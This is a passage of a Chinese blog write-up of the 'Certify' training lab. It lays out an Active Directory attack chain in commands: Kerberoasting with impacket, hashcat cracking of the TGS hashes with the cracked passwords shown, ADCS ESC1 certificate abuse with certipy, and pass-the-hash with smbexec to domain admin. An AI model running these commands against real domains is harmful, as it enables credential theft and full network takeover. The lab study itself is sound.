+	srcset="/p/certify/image-20260110160303770_hu_794a9ff09a1fdc45.png 480w, /p/certify/image-20260110160303770_hu_8d606d07efca55d.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260110160303770"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="1141"
+		data-flex-basis="2738px"
+	
+></p>
+<p><img src="/p/certify/image-20260110160216764.png"
+	width="796"
+	height="86"
+	srcset="/p/certify/image-20260110160216764_hu_c3b4d2e5779f436.png 480w, /p/certify/image-20260110160216764_hu_f690435f7a96ffc4.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260110160216764"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="925"
+		data-flex-basis="2221px"
+	
+></p>
+<p>找到了两个用户名和密码, 尝试rdp远程连接上去</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">proxychains4 xfreerdp /u:zhangjian /d:xiaorang.lab /p:i9XDE02pLVf /v:172.22.9.26 
+</span></span><span class="line"><span class="cl">proxychains4 xfreerdp /u:liupeng /d:xiaorang.lab /p:fiAzGwEMgTY  /v:172.22.9.26 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>但是这两个用户都连不上去</p>
+<h3 id="spn">spn
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">服务主体名称（SPN：ServicePrincipal Names）是服务实例的唯一标识符。可以理解为域内服务的身份证，每个服务都有一个唯一的SPN，而服务在注册SPN的时候会和账号进行绑定，因此SPN起到了将服务实例与服务登录帐户相关联的作用。一个SPN对应一个账户和一个服务，但一个账户可以对应多个SPN和服务
+</span></span><span class="line"><span class="cl">这里比较重要的是，任何一个域内账户都可以向DC查询所有域内用户对应的SPN并进行TGS交换过程，在KRB_TGS_REP过程将会返回查询到的用户的TGS tickets，然后我们即可使用爆破工具对于返回的票据进行爆破，获取对应明文。
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>前面的flag里面有提示说<code>spn</code>,查找下域用户下的spn</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">proxychains4 impacket-GetUserSPNs -request -dc-ip 172.22.9.7 xiaorang.lab/zhangjian:i9XDE02pLVf
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">impacket-GetUserSPNs : Impacket 工具包中的脚本, 用来查询域内拥有 SPN 的账户
+</span></span><span class="line"><span class="cl">-request: 请求一个 TGS票据, 这个票据是用于后续尝试离线破解服务账户的哈希
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>得到了chenchen和zhangxia的TGS票据</p>
+<p><img src="/p/certify/image-20260110160621233.png"
+	width="1527"
+	height="623"
+	srcset="/p/certify/image-20260110160621233_hu_10e7008e3d3fdd5.png 480w, /p/certify/image-20260110160621233_hu_69bf18f91a122e5.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260110160621233"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="245"
+		data-flex-basis="588px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$krb5tgs$23$*zhangxia$XIAORANG.LAB$xiaorang.lab/zhangxia*$9289dee557dfc4345107eeadeb308549$e463ef14972200b3919b7e2422405131b46d5bcdc717db67e91e931e1b59ca2425d7241827f354f483c8122512c82bb6a5e1598cc476f105c787aee4241b7f3b50ef4a964a8c1a323ee0e619e5017f50a983f8fb6bc2fc27fa3b7054344c6bd69e0d4b93220ba7f42893d04d6135b0c690c15b3c5ca81359f1d2110427fda10d349eb094697ff509e9f645ead5a83b429a1f58c8a716fb4c5075bc35db4146b9b42c0af1f9473d038a84bea59407c521dce826eabb370bf8a9912b910b231cae12fea60c610e811869b281e6b0c6bf523c8b9afec04de003279861f747a90c0240fddb607829968ced565e0d6e2deeb816b83aa34027b3229f16fceb4d4fe5475a1ff6a5126818b6213c6dc984d4eef14505784faab3d175477ee10e4fa7903832ced67772ba83f91e2ce04298c2888fd2b08cd1a5c81e517ee6beeb397fbfaa8f207bda0978e7a2d91b9e117646e0786163bebe1b6444ed1d106e4864b889b942ce1c9a1bc4e3a3b3d46b41fd2aaee8e1b4bf952afbc144584ca969e3bf896d158dce68dfd1a79b20bbd24c26582d4cd4e3be1891cded5ae024ff3286044d4f9aab804efc433a9a8e6141b7f2cc451f7c128d3c9ded1ee7d6ca1d80b161770ebe31d482053a6dfecf68f6d139c2454c61de0410806fd7821621549a765769ddb29d473da1c6dfc386c4b6f0aff6d9857348048caae2752dffde3ad3c5597ce6a3e9657dce5394b937e93892ed22b1cf1de002fd2f811e9a4c4ea2e7bb95609c0b87a794eba46a0d019b3664feaa4f3ec3c22d5cf3b92aef00ff2acacccc0730ef5f8ce1d269b083e4135b3260c58da01e9115527d6c4ead652fac31041fa730b3a95a858aca8087f8d48eb05c9900b1cd4d2f33162b2fd028d995b2f28ce83585d507754badc643afc9955b102f36ba34f8b80b722f15b61d80fe58aa17b619cdc17c0c231410381f54198d2eaee29113d6ca3513985fd92e0c657f0c1182330a3d49f3300771840763d8b2e1422420c4fd2d6f80dc9451367afe6d468f1a0a05313839130026d39acd181a4a5746d3bedb774a4922d8e1020aa4b46aee9a64ad62cd9bb2b924413385ddffe7a94fec612d3f5fa3092db2dca181de727679b0578fb8cce8c79a33fe1179c04b09774af9a4ac8324d41eb82540e7eb8cd95cf87aa1121ae2caed8ec6612b098ccabf65059fbb717eb0056a86c4505bdff8f4edaf5cc11824498427638fc75983c8c612c22b75b4ef576633ea3cfdb120d5fa47be6c7a3251c23c0f9c8e62eddc5d46f1b8f6f8ce76f5efdde80dcf252841d72ca1e4f3fa434d9ba9f6656ffa4e59f9476d51f4a7b0a86cbd0aa03bbf9fbea2246c91630da061aa844744476930486bb445f822857c05086a57b8b3763dbe44d41a14e832a496fac5d32c7a4db346996a60a64cb0e139d60c474cfd1e7f4716c83db8a700e5f04cad4ec8088558843a6ce4d49813d3570cfdeb9c872fd5ad91e559b4f5d7393a4f394c40c5134859
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$krb5tgs$23$*chenchen$XIAORANG.LAB$xiaorang.lab/chenchen*$ba9ad5905310eb257952d2e970ed94ac$21301798e7be80a4260eb83412c3d8772e53832b2c9ce344523ab36f78b212e5cf2e9ea4e8882d4d9d6fc9912aa6fb98016b3aaee6aaae0d13d3b899be902cceeb2bb9e38a7f1f40ac48fd8bf2b15836f3f7bde0fcdc35aa7c4d278e47c30be4b350bdc5745fa43e15166ab0e4ef6766b5fc192ac999576246913cbafe74e22345e5f48d5066f54cb4e283f888d574e5e25edac9159c1f2a933407fae70d8fcb2db105637cf02e09e5996fb799af39a4f985346c614f8b177ee491492a6e965aab294e92a6d831915fafa4b65f4f7fcae5af2f62adf880201b1b84a2d0957682217643519d99bd5b2346990d79510f8b2ea5d03176a4f9994af8541c893738e5cd7eb3e5d1bdac20819c151ae934f24b8388fca00efd0ceed4c3610b7505c498c2fb2106e1ec573e6e891f2320e9dae854f945e186da205c15e561dda3a13f17aa411c27f940b3bae5c65f11e71aeb7d60747afeafdc9cdf4f0cc00024a62af2bc5b5fa13b83696056419d57a2f494d900fc215c8e6c844cbcf9fe551ae32692139112e13844b6b4a27364e89381eabfb6018b34999b9ccc7e65be84ff970cb27362bd877eb1af29a808f11d636630424b3379a66227d622b34134ae2c0512e865ebbc6f97746fd05ee03a00a0b8552984c2487a822ef19794fb62dc4b6ad8db29c8b7ff588e2fc9eb7dad240f3b7bf5373853bee59c99b7981b723d99e2c420114c60626474439b9e951d014c3fcee5443e4fb60babfdd37f4116ca970a28ed9e3478757e4007df9a2483619ee2f857bbec8b727701de4b2d01e2ebeb60cc59e60861d60cc81a1ecbac5b205ad337939964208e97d1dc4edee64d0c6dc18955db62ac0b6185e7c778081cdbdce1706ba9c5e8cab58b90c789d47f4e40f521457fc42da5b2009e5e666b3d6f0766dbe7040c13324c352b6ae4107fc85e5f179e6e424fcb22a856c870bf74cd316d483b351f961ecc15ea27eb996cdbe4225945c7388a451a393aa89e31bff069bf5ed91d2702cda6205d242b75f527b98e40509802254cec63e1708fc49ddefeadddb8c75f6bb3dc04f763c63265a7812bce1bb479ce90e250be10e05e71de2edf36b8f50a41dd0a70b6b6313acd67cd721b51be3250595b00d14b2ab7471b2712423a25a209bf9f37ce922e3d40312a54b40e3c12c00d97e8f63d52c4a6bae4218b070c37c5f0e522454d9a971fcf4de1a2b04f7744080f9d32c64684db84883530b4721b837cc7664246bee7978239cddbb65fda660a96982f44c189ddb0c7f44357aa3eb58ad83e206b8ed16957152a2b23a02eea82dee8a99be7d0c515af16321aabc91166682a06ce84ff6b49643e19834e47d0150dcc5e99173c5c748db69659d54a7f3c95b85aae03941c45210e978b6678c12711861ec1732a338ad5c6f3bbd6350fdbf6920b5d23822081b662e9676fe214c4c8ab67520ddce3eeea94a3613ab1199f4f68953108ac0fd63599b55eaddee87293921f488ba65d46923c 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>hashcat爆破hash明文密码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">hashcat -m 13100 -a 0 hash.txt /usr/share/wordlists/rockyou.txt --force --show
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">-m 13100: 指定hash类型, 一般TGS票据中提取的hash格式就是这种类型
+</span></span><span class="line"><span class="cl">-a 0 : 指定攻击模式为 字典攻击, 也就是字典中的每个词依次尝试作为密码
+</span></span><span class="line"><span class="cl">--force: 强制运行 Hashcat，即使系统（或驱动）不完全兼容或不推荐也继续执行
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/certify/image-20260110162128200.png"
+	width="1658"
+	height="446"
+	srcset="/p/certify/image-20260110162128200_hu_20833677fe93d026.png 480w, /p/certify/image-20260110162128200_hu_a79e726cfd5660ff.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260110162128200"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="371"
+		data-flex-basis="892px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">zhangxia:MyPass2@@6
+</span></span><span class="line"><span class="cl">chenchen:@Passw0rd@
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">proxychains4 xfreerdp /u:zhangxia /d:xiaorang.lab /p:MyPass2@@6 /v:172.22.9.26 /drive:share,/mnt/xpw/kali_shard
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>flag在Administrator下面, 但是没有权限访问</p>
+<p><img src="/p/certify/image-20260110162235427.png"
+	width="731"
+	height="168"
+	srcset="/p/certify/image-20260110162235427_hu_a88d308297a594e3.png 480w, /p/certify/image-20260110162235427_hu_7550e1c0ad402a63.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260110162235427"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="435"
+		data-flex-basis="1044px"
+	
+></p>
+<h3 id="adcs-esc1-证书服务提权flag3-4">ADCS ESC1-证书服务提权（flag3-4）
+</h3><p>结合考点, 可能证书方面存在利用漏洞,用Certify.exe定位漏洞</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">C:\Users\zhangxia\Desktop\Certify.exe find /vulnerable
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>也可以用kali打</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">proxychains4 certipy-ad find -u &#39;zhangxia@xiaorang.lab&#39;  -password &#39;MyPass2@@6&#39; -dc-ip 172.22.9.7 -vulnerable -stdout
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/certify/image-20260110164155129.png"
+	width="851"
+	height="655"
+	srcset="/p/certify/image-20260110164155129_hu_7e4d724073d78f1c.png 480w, /p/certify/image-20260110164155129_hu_dae30a8709851dad.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260110164155129"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="129"
+		data-flex-basis="311px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ESC1利用前提条件：
+</span></span><span class="line"><span class="cl">msPKI-Certificates-Name-Flag: ENROLLEE_SUPPLIES_SUBJECT
+</span></span><span class="line"><span class="cl">表示基于此证书模板申请新证书的用户可以为其他用户申请证书，即任何用户，包括域管理员用户
+</span></span><span class="line"><span class="cl">PkiExtendedKeyUsage: Client Authentication
+</span></span><span class="line"><span class="cl">表示将基于此证书模板生成的证书可用于对 Active Directory 中的计算机进行身份验证
+</span></span><span class="line"><span class="cl">Enrollment Rights: NT Authority\Authenticated Users
+</span></span><span class="line"><span class="cl">表示允许 Active Directory 中任何经过身份验证的用户请求基于此证书模板生成的新证书
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>申请域管证书:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Certify.exe request /ca:CA01.xiaorang.lab\xiaorang-CA01-CA /template:&#34;XR Manager&#34; /altname:XIAORANG.LAB\Administrator
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>发现网络有问题，那就只能用kali打了</p>
+<p>改一下/etc/hosts，避免超时</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo vim /etc/hosts
+</span></span><span class="line"><span class="cl">172.22.9.7 XIAORANG-DC.xiaorang.lab
+</span></span><span class="line"><span class="cl">172.22.9.13 CA01.xiaorang.lab
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>利用 ESC1为域管理员申请证书</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">proxychains4 certipy req -u &#39;zhangxia@xiaorang.lab&#39; -p &#39;MyPass2@@6&#39; -target 172.22.9.7 -dc-ip 172.22.9.7 -ca &#39;xiaorang-XIAORANG-DC-CA&#39; -template &#39;XR Manager&#39; -upn &#39;administrator@xiaorang.lab&#39;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/certify/image-20260110174543962.png"
+	width="1578"
+	height="286"
+	srcset="/p/certify/image-20260110174543962_hu_628a71f3090383b7.png 480w, /p/certify/image-20260110174543962_hu_6b45f6dfe49653cc.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260110174543962"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="551"
+		data-flex-basis="1324px"
+	
+></p>
+<p>拿到生成的administrator.pfx获取域管哈希</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">proxychains4 certipy auth -pfx administrator.pfx -dc-ip 172.22.9.7
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/certify/image-20260110174623068.png"
+	width="1033"
+	height="313"
+	srcset="/p/certify/image-20260110174623068_hu_f425e261364d4087.png 480w, /p/certify/image-20260110174623068_hu_aa8913bbf5f52ee8.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260110174623068"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="330"
+		data-flex-basis="792px"
+	
+></p>
+<p>pth拿域管（哈希传递攻击）</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">proxychains4 impacket-smbexec -hashes :2f1b57eefb2d152196836b0516abea80 xiaorang.lab/administrator@172.22.9.26
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">type c:\users\administrator\flag\flag03.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/certify/image-20260110172522660.png"
+	width="1124"
+	height="447"
+	srcset="/p/certify/image-20260110172522660_hu_361cde16c586d7e4.png 480w, /p/certify/image-20260110172522660_hu_f18d2edb1644a2a4.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260110172522660"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="251"
+		data-flex-basis="603px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">proxychains4 impacket-smbexec -hashes :2f1b57eefb2d152196836b0516abea80 xiaorang.lab/administrator@172.22.9.7
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">type c:\users\administrator\flag\flag04.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/certify/image-20260110172622797.png"
+	width="1005"
+	height="355"
+	srcset="/p/certify/image-20260110172622797_hu_54df9886463fb6d9.png 480w, /p/certify/image-20260110172622797_hu_9770b8d83b73bac7.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260110172622797"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="283"
+		data-flex-basis="679px"
+	
+></p>
+<p>参考</p>
+<p><a class="link" href="https://www.yuque.com/yuqueyonghu20ymon/ct8qga/qfin8amhktkhxnfr#xa1Gs"  target="_blank" rel="noopener"
+    >春秋云镜 Certify</a></p>
+<p><a class="link" href="https://blog.csdn.net/uuzeray/article/details/141891270"  target="_blank" rel="noopener"
+    >【内网渗透】最保姆级的春秋云镜Certify打靶笔记_jndiexploit-2.0-snapshot-CSDN博客</a></p>
+<p><a class="link" href="https://xz.aliyun.com/news/11563"  target="_blank" rel="noopener"
+    >记一次春秋云镜域渗透靶场Certify-先知社区</a></p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/emo/">Emo</a>
+        
+    </section>
+
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>谢谢观看</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="">
+    <a href="/p/cyber-lab8/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">cyber-lab8</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/cyber-lab6/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">cyber-lab6</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/cyber-lab7/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">cyber-lab7</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/cyber-lab4/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">cyber-lab4</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/cyber-lab5/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">cyber-lab5</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <script src="https://utteranc.es/client.js" 
+        repo=""
+        issue-term="pathname"
+        
+        crossorigin="anonymous"
+        async
+        >
+</script>
+
+<style>
+    .utterances {
+        max-width: unset;
+    }
+</style>
+
+<script>
+    let utterancesLoaded = false;
+
+    function setUtterancesTheme(theme) {
+        let utterances = document.querySelector('.utterances iframe');
+        if (utterances) {
+            utterances.contentWindow.postMessage(
+                {
+                    type: 'set-theme',
+                    theme: `github-${theme}`
+                },
+                'https://utteranc.es'
+            );
+        }
+    }
+
+    addEventListener('message', event => {
+        if (event.origin !== 'https://utteranc.es') return;
+
+        
+        utterancesLoaded = true;
+        setUtterancesTheme(document.documentElement.dataset.scheme)
+    });
+
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (!utterancesLoaded) return;
+        setUtterancesTheme(e.detail)
+    })
+</script>
+
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2025 - 
+        
+        2026 luokaihong
+    </section>
+    
+    <section class="powerby">
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
